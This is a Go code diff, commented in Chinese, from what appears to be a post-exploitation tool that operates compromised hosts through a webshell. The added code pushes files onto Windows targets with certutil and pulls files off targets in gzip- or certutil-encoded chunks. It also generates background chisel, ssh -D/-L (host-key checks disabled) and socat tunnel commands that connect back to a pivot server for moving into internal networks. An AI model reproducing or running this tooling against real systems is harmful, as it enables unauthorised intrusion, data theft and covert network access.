-	if !ok {
-		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
-		return out, errors.New(out.Note)
-	}
-	if strings.HasSuffix(normalized, `\`) {
-		out.IsError, out.Note = true, "Windows 目标路径必须是文件而不是目录"
-		return out, errors.New(out.Note)
-	}
-	suffix := fmt.Sprintf(".jw%d", time.Now().UnixNano())
-	b64Temp, _, ok := intranetWindowsPath(normalized + suffix + ".b64")
-	if !ok {
-		out.IsError, out.Note = true, "无法构造临时文件路径"
-		return out, errors.New(out.Note)
-	}
-	binTemp, _, ok := intranetWindowsPath(normalized + suffix + ".bin")
-	if !ok {
-		out.IsError, out.Note = true, "无法构造临时文件路径"
-		return out, errors.New(out.Note)
-	}
-	cleanup := func() {
-		_ = s.intranetRun(ctx, pg, sess, "del /f /q "+b64Temp+" "+binTemp, 10*time.Second)
-	}
-
-	existed := false
-	probe := s.intranetRun(ctx, pg, sess, "if exist "+target+" (echo JW_FILE_EXISTS) else (echo JW_FILE_NEW)", 15*time.Second)
-	if strings.Contains(probe.Output, "JW_FILE_EXISTS") {
-		existed = true
-	}
-
-	for offset := 0; offset < len(content); offset += intranetWindowsUploadChunk {
-		end := offset + intranetWindowsUploadChunk
-		if end > len(content) {
-			end = len(content)
-		}
-		op := ">>"
-		if offset == 0 {
-			op = ">"
-		}
-		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
-		part := s.intranetRun(ctx, pg, sess, "echo "+chunk+op+b64Temp, 30*time.Second)
-		if part.IsError {
-			cleanup()
-			msg := fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetWindowsUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
-			_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
-			return part, errors.New(msg)
-		}
-	}
-
-	decode := s.intranetRun(ctx, pg, sess, "certutil -decode -f "+b64Temp+" "+binTemp, 30*time.Second)
-	if decode.IsError {
-		cleanup()
-		msg := "certutil 解码失败: " + strings.TrimSpace(decode.Output+decode.Note)
-		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
-		return decode, errors.New(msg)
-	}
-	sizeOut := s.intranetRun(ctx, pg, sess, intranetWindowsSizeCmd(binTemp), 20*time.Second)
-	got, _ := strconv.Atoi(strings.TrimSpace(sizeOut.Output))
-	if got != len(content) {
-		cleanup()
-		msg := fmt.Sprintf("解码后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(sizeOut.Output))
-		sizeOut.IsError, sizeOut.Note = true, msg
-		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
-		return sizeOut, errors.New(msg)
-	}
-
-	moved := s.intranetRun(ctx, pg, sess, "move /y "+binTemp+" "+target, 20*time.Second)
-	if moved.IsError {
-		cleanup()
-		msg := "覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
-		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
-		return moved, errors.New(msg)
-	}
-	cleanup()
-	out = moved
-	// move 的本地化提示在部分系统上仍按 OEM 编码输出，省略它以免污染 JSON。
-	out.Output = fmt.Sprintf("已写入 %s（%d 字节）", path, len(content))
-	_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(out.Output, 4000), false)
-	if !existed {
-		s.registerUploadedArtifact(ctx, pg, sess, intranetOSWindows, path, len(content), &out)
 	}
 	return out, nil
 }
@@ -608,6 +992,206 @@ func (s *Server) registerUploadedArtifact(ctx context.Context, pg *db.DB, sess *
 	_ = pg.AddIntranetSessionEvent(sess.ID, "artifact", targetPath, fmt.Sprintf("登记落地物 #%d（%s）", art.ID, name), false)
 }
 
+func intranetDownloadChunkRun(run intranetCommandRunner, path string, offset, n int64, useGzip bool) ([]byte, intranetExecOutcome, bool) {
+	out := run(intranetDownloadChunkCmd(path, offset, n, useGzip), 60*time.Second)
+	if out.IsError {
+		if strings.TrimSpace(out.Note) == "" {
+			out.Note = "读取分块失败"
+		}
+		return nil, out, false
+	}
+	raw, ok := parseIntranetChunk(out.Output)
+	if !ok {
+		out.IsError, out.Note = true, "分块响应缺少标记或 base64 无效"
+		return nil, out, false
+	}
+	data := raw
+	if useGzip {
+		data, ok = parseGzipChunk(raw)
+		if !ok {
+			out.IsError, out.Note = true, "分块 gzip 解压失败"
+			return nil, out, false
+		}
+	}
+	if int64(len(data)) != n {
+		out.IsError = true
+		out.Note = fmt.Sprintf("分块大小不符（期望 %d，实际 %d）", n, len(data))
+		return nil, out, false
+	}
+	return data, out, true
+}
+
+func intranetDownloadPOSIX(run intranetCommandRunner, path string, maxBytes int) (data []byte, total int64, truncated, compressed bool, out intranetExecOutcome) {
+	out = intranetExecOutcome{ExitCode: -1}
+	meta := run(intranetDownloadMetaCmd(path), 20*time.Second)
+	if meta.IsError {
+		meta.IsError = true
+		if strings.TrimSpace(meta.Note) == "" {
+			meta.Note = "无法读取文件大小（文件可能不存在或不是普通文件）"
+		}
+		return nil, 0, false, false, meta
+	}
+	total, gzipOK, ok := parseIntranetDownloadMeta(meta.Output)
+	if !ok {
+		out.IsError, out.Note = true, "无法读取文件大小（文件可能不存在或不是普通文件）"
+		return nil, 0, false, false, out
+	}
+	want := total
+	if int64(maxBytes) < want {
+		want = int64(maxBytes)
+		truncated = true
+	}
+	var buf bytes.Buffer
+	for offset := int64(0); offset < want; offset += int64(intranetDownloadChunk) {
+		n := int64(intranetDownloadChunk)
+		if offset+n > want {
+			n = want - offset
+		}
+		chunk, part, ok := intranetDownloadChunkRun(run, path, offset, n, gzipOK)
+		if !ok && gzipOK {
+			// The target may have lost gzip between the capability probe and the
+			// chunk. Retry this chunk uncompressed and stop compressing the rest.
+			chunk, part, ok = intranetDownloadChunkRun(run, path, offset, n, false)
+			if ok {
+				gzipOK = false
+			}
+		}
+		if !ok {
+			return nil, total, truncated, compressed, part
+		}
+		if gzipOK {
+			compressed = true
+		}
+		buf.Write(chunk)
+	}
+	data = buf.Bytes()
+	if int64(len(data)) != want {
+		out.IsError = true
+		out.Note = fmt.Sprintf("下载大小不符（期望 %d，实际 %d）", want, len(data))
+		return nil, total, truncated, compressed, out
+	}
+	out.ExitCode = 0
+	note := ""
+	if compressed {
+		note = "，gzip 分块压缩"
+	}
+	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节%s）", path, len(data), total, note)
+	return data, total, truncated, compressed, out
+}
+
+func intranetWindowsPSDownloadChunkCmd(normalized string, offset, n int64) string {
+	script := fmt.Sprintf(`$p='%s';$fs=[IO.File]::OpenRead($p);[void]$fs.Seek(%d,'Begin');`+
+		`$buf=New-Object byte[] %d;$n=$fs.Read($buf,0,%d);$fs.Close();`+
+		`$ms=New-Object IO.MemoryStream;$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Compress);`+
+		`$gz.Write($buf,0,$n);$gz.Close();[Convert]::ToBase64String($ms.ToArray())`,
+		normalized, offset, n, n)
+	return "echo " + intranetChunkMarker + " & \"" + intranetWindowsPowerShellPath() +
+		"\" -NoProfile -NonInteractive -Command \"" + script + "\" & echo " + intranetChunkEndMarker
+}
+
+func intranetDownloadWindowsPS(run intranetCommandRunner, normalized string, total int64) ([]byte, intranetExecOutcome, bool) {
+	out := intranetExecOutcome{ExitCode: -1}
+	var buf bytes.Buffer
+	for offset := int64(0); offset < total; offset += int64(intranetDownloadChunk) {
+		n := int64(intranetDownloadChunk)
+		if offset+n > total {
+			n = total - offset
+		}
+		part := run(intranetWindowsPSDownloadChunkCmd(normalized, offset, n), 60*time.Second)
+		raw, ok := parseIntranetChunk(part.Output)
+		if part.IsError || !ok {
+			if strings.TrimSpace(part.Note) == "" {
+				part.Note = "PowerShell 分块下载失败"
+			}
+			part.IsError = true
+			return nil, part, false
+		}
+		data, zok := parseGzipChunk(raw)
+		if !zok {
+			part.IsError, part.Note = true, "PowerShell 分块 gzip 解压失败"
+			return nil, part, false
+		}
+		if int64(len(data)) != n {
+			part.IsError = true
+			part.Note = fmt.Sprintf("分块大小不符（期望 %d，实际 %d）", n, len(data))
+			return nil, part, false
+		}
+		buf.Write(data)
+	}
+	out.ExitCode = 0
+	return buf.Bytes(), out, true
+}
+
+// intranetDownloadWindowsCertutil is the fallback for hosts without
+// PowerShell. certutil encodes the whole file, so callers cap this path to
+// keep one webshell response bounded.
+func intranetDownloadWindowsCertutil(run intranetCommandRunner, path, target string, total int64) ([]byte, int64, bool, intranetExecOutcome) {
+	out := intranetExecOutcome{ExitCode: -1}
+	temp := fmt.Sprintf(`"%%TEMP%%\jw%d.b64"`, time.Now().UnixNano())
+	cleanup := func() {
+		_ = run("del /f /q "+temp, 10*time.Second)
+	}
+	enc := run("certutil -encode -f "+target+" "+temp, 30*time.Second)
+	if enc.IsError {
+		cleanup()
+		enc.IsError = true
+		enc.Note = "certutil 编码失败: " + strings.TrimSpace(enc.Output+enc.Note)
+		return nil, total, false, enc
+	}
+	dump := run("type "+temp, 45*time.Second)
+	cleanup()
+	if dump.IsError {
+		return nil, total, false, dump
+	}
+	data, derr := parseCertutilBase64(dump.Output)
+	if derr != nil {
+		out.IsError, out.Note = true, "解析 certutil 输出失败: "+derr.Error()
+		return nil, total, false, out
+	}
+	out.ExitCode = 0
+	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节）", path, len(data), total)
+	return data, total, false, out
+}
+
+func intranetDownloadWindows(run intranetCommandRunner, path string, maxBytes int) ([]byte, int64, bool, bool, intranetExecOutcome) {
+	out := intranetExecOutcome{ExitCode: -1}
+	target, normalized, ok := intranetWindowsPath(path)
+	if !ok {
+		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
+		return nil, 0, false, false, out
+	}
+	sizeOut := run(intranetWindowsSizeCmd(target), 20*time.Second)
+	total, err := strconv.ParseInt(strings.TrimSpace(sizeOut.Output), 10, 64)
+	if err != nil || sizeOut.IsError {
+		out.IsError, out.Note = true, "无法读取文件大小（文件可能不存在或不是普通文件）"
+		return nil, 0, false, false, out
+	}
+	if total > int64(maxBytes) {
+		out.IsError, out.Note = true, fmt.Sprintf("文件 %d 字节超过下载上限 %d 字节", total, maxBytes)
+		return nil, total, false, false, out
+	}
+	if total == 0 {
+		out.ExitCode = 0
+		out.Output = fmt.Sprintf("已读取 %s（0 字节，共 0 字节）", path)
+		return []byte{}, 0, false, false, out
+	}
+	ps := run(intranetWindowsPSAvailableCmd(), 15*time.Second)
+	if strings.Contains(ps.Output, intranetPSMarker+"1") {
+		data, psOut, ok := intranetDownloadWindowsPS(run, normalized, total)
+		if ok {
+			psOut.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节，PowerShell 分块 gzip）", path, len(data), total)
+			return data, total, false, true, psOut
+		}
+		// PowerShell exists but failed. certutil can still recover small files.
+		if total > intranetWindowsCertutilLimit {
+			psOut.IsError, psOut.Note = true, "PowerShell 分块下载失败: "+strings.TrimSpace(psOut.Output+psOut.Note)
+			return nil, total, false, false, psOut
+		}
+	}
+	data, gotTotal, truncated, out := intranetDownloadWindowsCertutil(run, path, target, total)
+	return data, gotTotal, truncated, false, out
+}
+
 func (s *Server) intranetDownload(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, maxBytes int) ([]byte, int64, bool, intranetExecOutcome) {
 	out := intranetExecOutcome{ExitCode: -1}
 	path = strings.TrimSpace(path)
@@ -619,86 +1203,26 @@ func (s *Server) intranetDownload(ctx context.Context, pg *db.DB, sess *db.Intra
 		maxBytes = intranetDownloadLimit
 	}
 	osKind := s.intranetOS(ctx, pg, sess)
-	if osKind == intranetOSWindows {
-		return s.intranetDownloadWindows(ctx, pg, sess, path, maxBytes)
+	run := func(command string, timeout time.Duration) intranetExecOutcome {
+		return s.intranetRun(ctx, pg, sess, command, timeout)
 	}
-	cmd := "jwn=$(head -c " + strconv.Itoa(maxBytes) + " " + shQuote(path) + " | base64 | tr -d '\\n'); " +
-		"printf '%s' \"$jwn\"; printf '\\n" + intranetSizeMarker + "'; wc -c < " + shQuote(path)
-	out = s.intranetRun(ctx, pg, sess, cmd, 45*time.Second)
+	var data []byte
+	var total int64
+	var truncated, compressed bool
+	if osKind == intranetOSWindows {
+		data, total, truncated, compressed, out = intranetDownloadWindows(run, path, maxBytes)
+	} else {
+		data, total, truncated, compressed, out = intranetDownloadPOSIX(run, path, maxBytes)
+	}
 	if out.IsError {
 		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, truncateIntranetOutput(out.Output+out.Note, 4000), true)
-		return nil, 0, false, out
+		return nil, total, truncated, out
 	}
-	encoded, sizeText := out.Output, ""
-	if idx := strings.LastIndex(out.Output, intranetSizeMarker); idx >= 0 {
-		encoded = out.Output[:idx]
-		sizeText = strings.TrimSpace(out.Output[idx+len(intranetSizeMarker):])
+	if compressed {
+		out.Output += "\n传输方式：gzip 分块压缩"
 	}
-	encoded = strings.Join(strings.Fields(encoded), "")
-	data, err := base64.StdEncoding.DecodeString(encoded)
-	if err != nil {
-		out.IsError, out.Note = true, "返回内容不是有效 base64（目标可能缺少 base64 命令）"
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
-		return nil, 0, false, out
-	}
-	total, _ := strconv.ParseInt(strings.Fields(sizeText + " 0")[0], 10, 64)
-	truncated := total > int64(len(data))
-	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节）", path, len(data), total)
 	_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Output, false)
 	return data, total, truncated, out
-}
-
-// intranetDownloadWindows uses certutil to encode the file, then parses the
-// base64 between its BEGIN/END markers. The size is checked first so a large
-// file is rejected before its whole content crosses the webshell.
-func (s *Server) intranetDownloadWindows(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, maxBytes int) ([]byte, int64, bool, intranetExecOutcome) {
-	out := intranetExecOutcome{ExitCode: -1}
-	target, _, ok := intranetWindowsPath(path)
-	if !ok {
-		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
-		return nil, 0, false, out
-	}
-	sizeOut := s.intranetRun(ctx, pg, sess, intranetWindowsSizeCmd(target), 20*time.Second)
-	total, err := strconv.ParseInt(strings.TrimSpace(sizeOut.Output), 10, 64)
-	if err != nil || sizeOut.IsError {
-		out.IsError, out.Note = true, "无法读取文件大小（文件可能不存在或不是普通文件）"
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
-		return nil, 0, false, out
-	}
-	if total > int64(maxBytes) {
-		out.IsError, out.Note = true, fmt.Sprintf("文件 %d 字节超过下载上限 %d 字节", total, maxBytes)
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
-		return nil, 0, false, out
-	}
-	temp := fmt.Sprintf(`"%%TEMP%%\jw%d.b64"`, time.Now().UnixNano())
-	cleanup := func() {
-		_ = s.intranetRun(ctx, pg, sess, "del /f /q "+temp, 10*time.Second)
-	}
-	enc := s.intranetRun(ctx, pg, sess, "certutil -encode -f "+target+" "+temp, 30*time.Second)
-	if enc.IsError {
-		cleanup()
-		msg := "certutil 编码失败: " + strings.TrimSpace(enc.Output+enc.Note)
-		enc.IsError, enc.Note = true, msg
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, msg, true)
-		return nil, 0, false, enc
-	}
-	dump := s.intranetRun(ctx, pg, sess, "type "+temp, 45*time.Second)
-	cleanup()
-	if dump.IsError {
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, truncateIntranetOutput(dump.Output+dump.Note, 4000), true)
-		return nil, 0, false, dump
-	}
-	data, derr := parseCertutilBase64(dump.Output)
-	if derr != nil {
-		out.IsError, out.Note = true, "解析 certutil 输出失败: "+derr.Error()
-		_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Note, true)
-		return nil, 0, false, out
-	}
-	out.ExitCode = 0
-	out.Output = fmt.Sprintf("已读取 %s（%d 字节，共 %d 字节）", path, len(data), total)
-	_ = pg.AddIntranetSessionEvent(sess.ID, "download", path, out.Output, false)
-	return data, total, false, out
 }
 
 // intranetProbe collects OS/user/tool availability from the target.
@@ -775,43 +1299,52 @@ func intranetPivotEndpoint() (string, error) {
 // autoSelectTunnelCommand picks the best deployment command based on what tools
 // are available on the target. 隧道自动选型：目标上有什么就用什么，优先选
 // 功能最强的工具（chisel > ssh > socat），而不是让操作员自己猜。
-func autoSelectTunnelCommand(kind string, info intranetProbeInfo, t *db.IntranetTunnel) (deploy, reason string) {
+//
+// listenSide says where the listener actually ends up, which is not always the
+// target: chisel client creates the SOCKS/forward listener on its server (the
+// control end), while socat, ssh -D and ssh -L listen where they run — the
+// target. Verify and teardown must look on that side or they "fail" a working
+// tunnel and re-check a port that was never there.
+func autoSelectTunnelCommand(kind string, info intranetProbeInfo, t *db.IntranetTunnel) (deploy, reason, listenSide string) {
 	listenPort := t.ListenPort
 	remoteHost := t.RemoteHost
 	remotePort := t.RemotePort
-	tunnelID := strconv.FormatInt(t.ID, 10)
 	pivotHost, pivotPort, pivotErr := intranetPivotServer()
+	listenSide = db.IntranetListenSideTarget
 
 	switch kind {
 	case db.IntranetTunnelKindSocks5:
 		// SOCKS5: chisel > ssh -D
 		if listenPort <= 0 {
-			return "", "SOCKS5 需要 listen_port（目标上的 SOCKS 监听端口）"
+			return "", "SOCKS5 需要 listen_port（目标上的 SOCKS 监听端口）", listenSide
 		}
 		if intranetHasBin(info, "chisel") {
 			if pivotErr != nil {
-				return "", pivotErr.Error()
+				return "", pivotErr.Error(), listenSide
 			}
 			pivot, _ := intranetPivotEndpoint()
-			deploy = fmt.Sprintf("nohup chisel client --fingerprint auto %s %d:socks </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
-				shQuote(pivot), listenPort, tunnelID)
-			reason = "目标有 chisel，用 chisel client 建 SOCKS5（目标监听 " + strconv.Itoa(listenPort) + "）"
+			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("chisel client --fingerprint auto %s %d:socks", shQuote(pivot), listenPort))
+			reason = "目标有 chisel，用 chisel client 建 SOCKS5：监听端口开在控制端（" + pivot + "），出口在目标，" +
+				"所以控制端探测自己的 " + strconv.Itoa(listenPort) + " 即可，目标侧的端口检查验证不到它"
+			return deploy, reason, db.IntranetListenSidePivot
 		} else if intranetHasBin(info, "ssh") {
 			if pivotErr != nil {
-				return "", pivotErr.Error()
+				return "", pivotErr.Error(), listenSide
 			}
-			deploy = fmt.Sprintf("nohup ssh -N -D 0.0.0.0:%d -p %d -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
-				listenPort, pivotPort, shQuote(pivotHost), tunnelID)
-			reason = "目标有 ssh，用 ssh -D 建 SOCKS5（目标监听 " + strconv.Itoa(listenPort) + "）"
+			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("ssh -N -D 0.0.0.0:%d -p %d -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s",
+				listenPort, pivotPort, shQuote(pivotHost)))
+			reason = "目标有 ssh，用 ssh -D 建 SOCKS5（目标监听 " + strconv.Itoa(listenPort) +
+				"；BatchMode 下要求目标到控制端已免密，否则会立刻失败而不是卡在口令提示。注意 -D 的出口在控制端，" +
+				"只能让目标借用控制端的网络，不能用于访问控制端不可达的内网段）"
 		} else {
-			return "", "目标上没有 chisel/ssh，无法自动建 SOCKS5；请手动提供 deploy_command"
+			return "", "目标上没有 chisel/ssh，无法自动建 SOCKS5；请手动提供 deploy_command", listenSide
 		}
-		return deploy, reason
+		return deploy, reason, listenSide
 
 	case db.IntranetTunnelKindPort, db.IntranetTunnelKindRemote:
 		// 端口转发：socat > ssh -L > chisel
 		if remoteHost == "" || remotePort <= 0 || listenPort <= 0 {
-			return "", "需要 listen_port、remote_host 与 remote_port"
+			return "", "需要 listen_port、remote_host 与 remote_port", listenSide
 		}
 		if intranetHasBin(info, "socat") {
 			listen := "TCP-LISTEN:" + strconv.Itoa(listenPort)
@@ -819,38 +1352,235 @@ func autoSelectTunnelCommand(kind string, info intranetProbeInfo, t *db.Intranet
 				listen += ",bind=" + h
 			}
 			listen += ",fork,reuseaddr"
-			base := "socat " + listen + " TCP:" + intranetHostPort(remoteHost, remotePort)
-			deploy = "nohup " + base + " </dev/null >/tmp/jw_tunnel_" + tunnelID + ".log 2>&1 & echo JW_PID:$!"
+			deploy = intranetBackgroundTunnel(t.ID, "socat "+listen+" TCP:"+intranetHostPort(remoteHost, remotePort))
 			reason = "目标有 socat，用 socat 做端口转发"
 		} else if intranetHasBin(info, "ssh") {
 			if pivotErr != nil {
-				return "", pivotErr.Error()
+				return "", pivotErr.Error(), listenSide
 			}
-			deploy = fmt.Sprintf("nohup ssh -N -L %d:%s:%d -p %d -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
-				listenPort, remoteHost, remotePort, pivotPort, shQuote(pivotHost), tunnelID)
-			reason = "目标没有 socat，用 ssh -L 做端口转发"
+			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("ssh -N -L %d:%s:%d -p %d -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s",
+				listenPort, remoteHost, remotePort, pivotPort, shQuote(pivotHost)))
+			reason = "目标没有 socat，用 ssh -L 做端口转发（注意：-L 的目的地由控制端发起，" +
+				"只有控制端也能访问 " + remoteHost + " 时才有意义；穿透到控制端不可达的内网段请改用 socat/chisel 或手工 deploy_command）"
 		} else if intranetHasBin(info, "chisel") {
 			if pivotErr != nil {
-				return "", pivotErr.Error()
+				return "", pivotErr.Error(), listenSide
 			}
 			pivot, _ := intranetPivotEndpoint()
 			spec := fmt.Sprintf("%d:%s:%d", listenPort, remoteHost, remotePort)
 			if kind == db.IntranetTunnelKindRemote {
 				spec = "R:" + spec
 			}
-			deploy = fmt.Sprintf("nohup chisel client --fingerprint auto %s %s </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
-				shQuote(pivot), spec, tunnelID)
-			reason = "目标没有 socat/ssh，用 chisel 做端口转发"
+			deploy = intranetBackgroundTunnel(t.ID, fmt.Sprintf("chisel client --fingerprint auto %s %s", shQuote(pivot), spec))
+			reason = "目标没有 socat/ssh，用 chisel 做端口转发：" +
+				map[bool]string{true: "R: 前缀让监听端口开在目标侧、目的地由控制端发起",
+					false: "监听端口开在控制端（" + pivot + "），目的地由目标发起，正是穿透内网要的方向"}[kind == db.IntranetTunnelKindRemote]
+			if kind != db.IntranetTunnelKindRemote {
+				return deploy, reason, db.IntranetListenSidePivot
+			}
 		} else {
-			return "", "目标上没有 socat/ssh/chisel，无法自动生成转发命令；请手动提供 deploy_command"
+			return "", "目标上没有 socat/ssh/chisel，无法自动生成转发命令；请手动提供 deploy_command", listenSide
 		}
-		return deploy, reason
+		return deploy, reason, listenSide
 	}
-	return "", "不支持的隧道类型: " + kind
+	return "", "不支持的隧道类型: " + kind, listenSide
 }
 
 func intranetVerifyCommand(port int) string {
 	return "(ss -lnt 2>/dev/null || netstat -lnt 2>/dev/null) | grep -qE '[:.]" + strconv.Itoa(port) + "[[:space:]]' && echo JW_TUNNEL_OK || echo JW_TUNNEL_FAIL"
+}
+
+// intranetTunnelTag is the on-target path prefix for a tunnel's log/pid files.
+func intranetTunnelTag(tunnelID int64) string {
+	if tunnelID <= 0 {
+		return ""
+	}
+	return "/tmp/jw_tunnel_" + strconv.FormatInt(tunnelID, 10)
+}
+
+// intranetBackgroundTunnel starts a long-lived tunnel client. The PID goes both to
+// stdout and to a pid file: a noisy webshell can swallow the echo, and a chisel or
+// ssh client whose PID we lost is a process nothing can stop afterwards.
+func intranetBackgroundTunnel(tunnelID int64, inner string) string {
+	tag := intranetTunnelTag(tunnelID)
+	if tag == "" {
+		return "nohup " + inner + " </dev/null >/dev/null 2>&1 & echo JW_PID:$!"
+	}
+	return "nohup " + inner + " </dev/null >" + tag + ".log 2>&1 & p=$!; echo $p >" + tag + ".pid; echo JW_PID:$p"
+}
+
+// intranetTunnelTeardown kills the captured PID and, when the ledger lost it, the
+// PID still recorded on the target — an empty teardown means evacuation silently
+// leaves the tunnel running.
+func intranetTunnelTeardown(pid int, tunnelID int64) string {
+	tag := intranetTunnelTag(tunnelID)
+	parts := []string{}
+	if cmd := intranetKillCommand(pid); cmd != "" {
+		parts = append(parts, cmd)
+	}
+	if tag != "" {
+		parts = append(parts, "p=$(cat "+tag+".pid 2>/dev/null); if [ -n \"$p\" ]; then kill \"$p\" 2>/dev/null; sleep 1; kill -9 \"$p\" 2>/dev/null; fi")
+	}
+	if len(parts) == 0 {
+		return ""
+	}
+	if tag != "" {
+		parts = append(parts, "rm -f "+tag+".pid "+tag+".log")
+	}
+	return strings.Join(parts, "; ")
+}
+
+// intranetPivotVerifyMarker records that the listener has to be checked on the
+// control side. chisel client opens its SOCKS/forward listener on the chisel
+// server, not where the client runs, so an `ss` on the target would report
+// JW_TUNNEL_FAIL for a tunnel that works.
+func intranetPivotVerifyMarker(port int) string {
+	return "pivot:tcp:" + strconv.Itoa(port)
+}
+
+func intranetTunnelListensOnPivot(t *db.IntranetTunnel) bool {
+	return t != nil && strings.EqualFold(strings.TrimSpace(t.ListenSide), db.IntranetListenSidePivot)
+}
+
+// intranetTunnelSide renders the recorded listen side with a stable default, so
+// ledgers and notes never print an empty field for rows written before the column.
+func intranetTunnelSide(t *db.IntranetTunnel) string {
+	if intranetTunnelListensOnPivot(t) {
+		return db.IntranetListenSidePivot
+	}
+	return db.IntranetListenSideTarget
+}
+
+// intranetListenSideArg validates a caller-supplied listen side. Empty means
+// "leave it to the ledger/auto-selection"; anything but the two known values is a
+// typo that would silently misplace verify and teardown.
+func intranetListenSideArg(side string) (string, error) {
+	v := strings.ToLower(strings.TrimSpace(side))
+	switch v {
+	case "", db.IntranetListenSideTarget, db.IntranetListenSidePivot:
+		return v, nil
+	}
+	return "", fmt.Errorf("listen_side 只能是 %s 或 %s", db.IntranetListenSideTarget, db.IntranetListenSidePivot)
+}
+
+// intranetPivotMarkerPort reads the port back out of a pivot:tcp:N verify command
+// so a tunnel row that lost its listen_port still gets verified.
+func intranetPivotMarkerPort(cmd string) int {
+	n, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(cmd), "pivot:tcp:")))
+	if err != nil || n <= 0 {
+		return 0
+	}
+	return n
+}
+
+// intranetVerifyFailReason condenses a failed check into one line for the ledger
+// note — the caller only sees this, so quoting the target's own words matters.
+func intranetVerifyFailReason(out intranetExecOutcome) string {
+	if line := strings.TrimSpace(out.Output); line != "" {
+		if i := strings.IndexByte(line, '\n'); i >= 0 {
+			line = line[:i]
+		}
+		return truncateIntranetOutput(line, 200)
+	}
+	if note := strings.TrimSpace(out.Note); note != "" {
+		return note
+	}
+	return "验证未确认监听端口在位"
+}
+
+// intranetHostIsLocal reports whether host is this machine (loopback or an
+// address on one of its interfaces).
+func intranetHostIsLocal(host string) bool {
+	host = strings.TrimSpace(strings.Trim(strings.TrimSpace(host), "[]"))
+	if host == "" {
+		return false
+	}
+	if h, _, err := net.SplitHostPort(host); err == nil {
+		host = h
+	}
+	if strings.EqualFold(host, "localhost") {
+		return true
+	}
+	if ip := net.ParseIP(host); ip != nil {
+		if ip.IsLoopback() {
+			return true
+		}
+	}
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return false
+	}
+	for _, a := range addrs {
+		var ip net.IP
+		switch n := a.(type) {
+		case *net.IPNet:
+			ip = n.IP
+		case *net.IPAddr:
+			ip = n.IP
+		}
+		if ip.String() == host {
+			return true
+		}
+	}
+	return false
+}
+
+// intranetPivotListenerState checks a control-side listener from here: read the
+// local socket table when the pivot is this machine (one distro's /proc/net/tcp
+// shows the shared listener set under WSL mirrored networking), otherwise prove
+// reachability with a TCP dial.
+func intranetPivotListenerState(host string, port int) (bool, string) {
+	host = strings.TrimSpace(host)
+	if port <= 0 {
+		return false, "缺少 listen_port，无法验证控制端监听端口"
+	}
+	if host == "" {
+		return false, "未配置 JINGWEI_PIVOT_SERVER，无法确定控制端监听地址"
+	}
+	if intranetHostIsLocal(host) {
+		for _, l := range collectListeners() {
+			if l.port == port {
+				return true, "控制端即本机：" + intranetHostPort(host, port) + " 正在监听"
+			}
+		}
+		return false, "控制端即本机，但本机没有 " + strconv.Itoa(port) + " 的 TCP 监听（chisel server 未启动，或未授权该端口）"
+	}
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 5*time.Second)
+	if err == nil {
+		_ = conn.Close()
+		return true, "控制端 " + intranetHostPort(host, port) + " TCP 可达"
+	}
+	return false, "控制端 " + intranetHostPort(host, port) + " 不可达：" + err.Error()
+}
+
+// intranetRetireFailedTunnel cleans up after a tunnel that failed verification:
+// the deploy process may still be running on the target while the ledger keeps an
+// active resource claiming the tunnel is usable. It runs the recorded teardown and
+// releases the resource row. The tunnel row is left as-is (failed) so evacuation
+// still walks it and re-checks the target.
+func (s *Server) intranetRetireFailedTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel, reason string) string {
+	out := "【失败回收】没有可执行的撤销命令（缺少 teardown_command/PID），目标上的进程未回收"
+	if cmd := strings.TrimSpace(t.TeardownCommand); cmd != "" && t.SessionID != nil && *t.SessionID > 0 {
+		if sess, err := s.intranetSession(pg, *t.SessionID); err != nil {
